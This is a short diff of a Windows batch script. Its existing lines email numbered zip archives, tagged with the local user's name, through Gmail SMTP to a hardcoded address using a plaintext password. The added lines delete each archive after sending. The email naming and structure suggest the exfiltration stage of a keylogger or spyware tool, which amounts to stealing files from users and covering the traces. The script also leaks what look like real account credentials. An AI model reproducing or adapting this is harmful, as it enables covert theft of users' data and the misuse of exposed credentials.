@@ -51,6 +51,13 @@ if not "%ErrorLevel%" == "1" (
 :: Send compress file 
 echo Sending message for Batch %num% >> "%LOGFILE%"
 "%SEEXEC%" -o tls=yes -f ardamax237@gmail.com -t ardamax237@gmail.com -s smtp.gmail.com:587 -xu ardamax237@gmail.com -xp C3POalfa -u "User: %USERNAME% - Batch %num%" -m "See attachment" -a "%READYDIR%\%num%.zip" -l "%APPLOC%\se-traffic.log"
+if not "%ErrorLevel%" == "1" (
+	goto clean
+)
+:clean 
+echo Cleaning ZIP file >> "%LOGFILE%"
+cd %READYDIR%
+del %num%.zip /S /Q
 
 :end
 echo %date% - %time% Program end >> "%LOGFILE%"
